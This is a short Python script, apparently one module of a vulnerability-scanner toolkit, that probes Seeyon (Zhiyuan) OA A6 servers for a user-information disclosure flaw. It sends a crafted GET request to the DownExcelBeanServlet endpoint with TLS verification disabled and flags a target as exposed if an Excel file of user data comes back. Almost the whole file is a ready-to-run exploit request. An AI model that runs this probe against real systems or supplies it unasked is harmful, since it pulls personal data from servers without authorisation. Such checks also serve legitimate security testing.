#!/usr/bin/env python
# coding=utf-8
#致远OAA6DownExcelBeanServlet用户敏感信息泄露

import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        response = requests.get(url=url + '/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0', verify=False,timeout=20)
        if response.status_code == 200 and b"[Content_Types].xml" in response.content and b"Excel.Sheet" in response.content:
            print(colored('[+]存在致远OAA6DownExcelBeanServlet用户敏感信息泄露', 'red'))
            results = f'{url}-->存在致远OAA6DownExcelBeanServlet用户敏感信息泄露'
        else:
            print('[-]不存在致远OAA6DownExcelBeanServlet用户敏感信息泄露')
    except:
        print('[-]不存在致远OAA6DownExcelBeanServlet用户敏感信息泄露')


def zhiyuanOA6YH(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
